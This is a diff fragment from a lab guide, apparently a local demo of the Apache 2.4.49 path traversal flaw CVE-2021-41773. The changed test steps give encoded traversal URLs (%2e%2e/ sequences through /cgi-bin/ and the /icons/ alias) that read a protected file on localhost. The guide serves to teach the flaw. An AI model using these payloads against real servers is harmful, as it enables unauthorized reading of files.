@@ -68,8 +68,8 @@ CVE-2021-41773 is a path traversal bug in Apache 2.4.49 caused by insufficient U
 **Test 1 — Browser visual demo**
 1. Open: `http://localhost:8080/`
 2. In the browser URL bar, try:
-   `http://localhost:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/opt/protected/protected.txt`
-3. If the browser normalizes the URL and it fails, try an encoding variant (e.g., `%2e%2e/` or `..%2f`).
+   `http://localhost:8080/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/opt/protected/protected.txt`
+3. If the browser normalizes the URL and it fails, try the same traversal pattern via the alternate alias from Test 3 (`/icons/%2e%2e/%2e%2e/...`) and confirm with `curl`.
 
 Expected (vulnerable): protected file contents are rendered as raw response text.
 
